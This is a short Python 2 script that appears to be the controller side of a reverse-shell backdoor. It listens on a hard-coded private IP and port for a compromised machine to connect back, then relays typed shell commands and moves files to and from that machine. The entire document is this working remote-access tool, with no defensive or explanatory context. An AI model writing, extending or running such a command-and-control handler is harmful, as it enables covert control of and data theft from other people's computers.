import socket
import json, base64
import sys

class Server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for connections...")
        self.connection, address = server.accept()
        print("[+] Connection of: " + str(address))

    def send_data(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def com_exe(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        return self.receive_data()

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)

                result = self.com_exe(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

            print(result)

try:
    my_server = Server("192.168.0.15", 1234)
    my_server.run()
except Exception:
    print("[-] Error during server execution.")